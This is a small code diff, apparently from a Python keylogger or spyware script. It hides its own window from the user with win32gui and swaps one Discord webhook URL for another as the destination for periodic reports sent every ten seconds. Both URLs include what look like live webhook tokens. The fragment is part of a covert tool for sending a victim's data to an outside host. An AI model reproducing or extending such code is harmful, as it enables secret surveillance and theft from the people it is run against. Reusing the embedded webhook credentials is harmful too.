@@ -6,7 +6,7 @@ import win32con
 win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_HIDE)
 
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/1001245209541226587/TLheWj3BKvWMC8-0d1jBGo8ED0If8qN9gXwXe7B1S2ztsEdDT8b3QEv2iVdUEMrDtiRv"  # Your discord webhook url goes here.
+WEBHOOK_URL = "https://discord.com/api/webhooks/1001245390269579285/15ztWY51GLE4-4nUQbcADz_cdXxtAvikv86VWxmE_-_MICjys2IvowyvcAofiPU8GPrQ"  # Your discord webhook url goes here.
 TIME_INTERVAL = 10  # You can set the amount of time between each report
 
 
